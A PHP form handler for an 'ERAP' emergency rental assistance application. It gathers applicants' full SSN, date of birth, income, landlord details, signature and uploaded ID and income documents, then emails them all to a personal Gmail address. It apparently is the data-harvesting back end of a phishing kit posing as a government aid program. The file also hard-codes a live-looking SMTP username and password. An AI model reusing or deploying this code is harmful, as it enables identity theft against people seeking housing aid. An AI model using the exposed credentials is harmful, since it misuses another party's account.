<?php
/**
 * ERAP Application Processor
 * Sends full application details, including full SSN and file uploads, via SMTP (PHPMailer-compatible).
 */
use PHPMailer\PHPMailer\PHPMailer;

require_once __DIR__ . '/mailer-lite.php';
require_once __DIR__ . '/simple-mailer.php';

$smtp = [
    'host'       => 'smtp.hostinger.com',
    'port'       => 465,
    'username'   => 'contact@earnestexpressllc.com',
    'password'   => 'Weareallmad123@',
    'secure'     => 'ssl',
    'from_email' => 'contact@earnestexpressllc.com',
    'from_name'  => 'Erap application',
    'to_email'   => 'earnestexpress12@gmail.com',
];

if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $clean = function ($key) {
        return isset($_POST[$key]) ? trim((string)$_POST[$key]) : '';
    };

    $name             = $clean('full_name');
    $dob              = $clean('date_of_birth');
    $email            = $clean('email');
    $phone            = $clean('phone');
    $ssn              = $clean('ssn'); // Full SSN required
    $address          = $clean('address');
    $city             = $clean('city');
    $state            = $clean('state');
    $zip              = $clean('zip');
    $employment       = $clean('employment_status');
    $employer         = $clean('employer_name');
    $household_size   = $clean('household_size');
    $income           = $clean('income');
    $income_sources   = $clean('income_sources');
    $current_rent     = $clean('current_rent');
    $months_past_due  = $clean('months_past_due');
    $total_arrears    = $clean('total_arrears');
    $future_rent      = $clean('future_rent');
    $total_assistance = $clean('total_assistance');
    $hardship         = $clean('hardship');
    $landlord_name    = $clean('landlord_name');
    $landlord_phone   = $clean('landlord_phone');
    $landlord_email   = $clean('landlord_email');
    $landlord_accepts = isset($_POST['landlord_accepts_payments']) ? 'Yes' : 'No';
    $rent_past_due    = $clean('rent_past_due');
    $rent_future      = $clean('rent_future');
    $utility_request  = isset($_POST['utility_assistance']) ? implode(', ', (array)$_POST['utility_assistance']) : 'None selected';
    $assistance_total = $clean('assistance_total');
    $contact_auth     = isset($_POST['contact_authorization']) ? 'Yes' : 'No';
    $accuracy_cert    = isset($_POST['accuracy_certification']) ? 'Yes' : 'No';
    $attestation      = isset($_POST['attestation']) ? 'Yes' : 'No';
    $digital_signature= $clean('digital_signature');
    $signature_date   = $clean('signature_date');

    $fields = [
        "FULL NAME" => $name,
        "DATE OF BIRTH" => $dob,
        "EMAIL" => $email,
        "PHONE" => $phone,
        "FULL SSN" => $ssn,
        "STREET ADDRESS" => $address,
        "CITY" => $city,
        "STATE" => $state,
        "ZIP" => $zip,
        "EMPLOYMENT STATUS" => $employment,
        "EMPLOYER NAME" => $employer,
        "HOUSEHOLD SIZE" => $household_size,
        "ANNUAL HOUSEHOLD INCOME" => $income,
        "INCOME SOURCES" => $income_sources,
        "CURRENT MONTHLY RENT" => $current_rent,
        "MONTHS PAST DUE" => $months_past_due,
        "TOTAL ARREARS" => $total_arrears,
        "FUTURE RENT REQUESTED" => $future_rent,
        "TOTAL ASSISTANCE REQUESTED" => $total_assistance,
        "HARDSHIP DESCRIPTION" => $hardship,
        "LANDLORD/PROPERTY MANAGER NAME" => $landlord_name,
        "LANDLORD PHONE" => $landlord_phone,
        "LANDLORD EMAIL" => $landlord_email,
        "LANDLORD ACCEPTS DIRECT PAYMENT" => $landlord_accepts,
        "RENT ASSISTANCE (PAST DUE)" => $rent_past_due,
        "RENT ASSISTANCE (FUTURE)" => $rent_future,
        "UTILITY ASSISTANCE REQUESTED" => $utility_request,
        "TOTAL AMOUNT REQUESTED (ALL CATEGORIES)" => $assistance_total,
        "CONTACT AUTHORIZATION" => $contact_auth,
        "ACCURACY CERTIFICATION" => $accuracy_cert,
        "ATTESTATION" => $attestation,
        "DIGITAL SIGNATURE" => $digital_signature,
        "SIGNATURE DATE" => $signature_date,
    ];

    $attachments = [
        'id_document' => 'Government-issued ID',
        'income_proof' => 'Proof of Income',
        'lease_agreement' => 'Lease Agreement',
        'eviction_notice' => 'Eviction or Past-Due Notice',
        'utility_bills' => 'Utility Bill',
    ];

    $sent = send_application_email(
        $smtp,
        "NEW ERAP APPLICATION: {$name}",
        $fields,
        $attachments,
        $email
    );

    if ($sent) {
        header("Location: ../erap-urs-prompt.html");
        exit();
    }

    echo "<h1>Application Error</h1>";
    echo "<p>We were unable to process your application at this time. Please contact support.</p>";
    echo "<pre>" . htmlspecialchars($sent ? '' : 'Unable to send application email.') . "</pre>";
    echo "<a href='../erap-apply.html'>Go Back</a>";
} else {
    header("Location: ../index.html");
    exit();
}
